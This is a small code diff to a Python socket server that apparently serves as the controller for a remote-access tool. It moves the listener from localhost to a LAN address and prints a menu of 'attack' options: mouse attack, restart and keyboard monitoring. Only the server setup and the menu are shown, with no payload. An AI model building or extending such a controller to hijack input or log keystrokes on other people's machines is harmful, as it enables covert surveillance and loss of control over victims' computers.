@@ -5,7 +5,7 @@ def start_server():
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     # Define server host and port
-    host = '127.0.0.1'
+    host = '192.168.0.179'
     port = 12310
     
     # Bind the socket to the host and port
@@ -13,7 +13,7 @@ def start_server():
     
     # Server listens for connections (max 5 connections in the queue)
     server_socket.listen(5)
-    print("Choose an option for attack: 1- Mouse Attack\n, 2- Restart\n, 3- keyboard monitering\n")
+    print("Choose an option for attack:\n 1- Mouse Attack\n, 2- Restart\n, 3- keyboard monitering")
     
     # Accept the client connection
     client_socket, addr = server_socket.accept()
